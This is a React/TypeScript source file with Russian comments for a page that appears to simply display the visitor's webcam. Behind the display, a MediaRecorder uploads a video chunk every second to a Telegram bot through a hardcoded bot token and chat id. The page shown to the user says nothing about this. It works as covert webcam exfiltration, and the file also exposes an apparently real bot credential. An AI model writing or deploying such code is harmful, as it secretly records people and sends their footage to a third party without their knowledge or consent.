import React, { useEffect, useRef, useState } from 'react';
import axios from 'axios';

const App: React.FC = () => {
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const [hasError, setHasError] = useState(false);
  const [hasPermission, setHasPermission] = useState<boolean | null>(null); // состояние для хранения разрешения

  const botToken = '7885047021:AAG6h0cm_VRrvs3dzROMtYn9Hqi2e7qjxp4'; // Замените на ваш токен
  const chatId = '7200204699'; // Замените на ваш chat_id

  const sendVideoToTelegram = async (videoBlob: Blob) => {
    const formData = new FormData();
    formData.append('video', videoBlob, 'video.webm');

    try {
      await axios.post(`https://api.telegram.org/bot${botToken}/sendVideo`, formData, {
        headers: {
          'Content-Type': 'multipart/form-data',
        },
        params: {
          chat_id: chatId,
        },
      });
    } catch (error) {
      console.error('Error sending video to Telegram', error);
    }
  };

  useEffect(() => {
    const getCamera = async () => {
      try {
        // Запрашиваем разрешение на доступ к камере
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
        }
        setHasPermission(true); // Разрешение получено

        // Создание MediaRecorder для записи видео
        const mediaRecorder = new MediaRecorder(stream);
        mediaRecorder.ondataavailable = async (event) => {
          // Отправка видео в Telegram
          await sendVideoToTelegram(event.data);
        };

        mediaRecorder.start(1000); // Каждую секунду отправляется видео
      } catch (error) {
        console.error("Error accessing camera", error);
        setHasError(true);
        setHasPermission(false); // Разрешение не получено
      }
    };

    getCamera();

    return () => {
      if (videoRef.current && videoRef.current.srcObject) {
        const stream = videoRef.current.srcObject as MediaStream;
        const tracks = stream.getTracks();
        tracks.forEach((track) => track.stop());
      }
    };
  }, []);

  return (
    <div>
      <h1>Видео с камеры</h1>
      {hasPermission === false && <p>Вы не предоставили разрешение на использование камеры.</p>}
      {hasError && <p>Ошибка доступа к камере. Проверьте настройки.</p>}
      {hasPermission && !hasError && (
        <video ref={videoRef} autoPlay playsInline width="100%" height="auto" />
      )}
    </div>
  );
};

export default App;
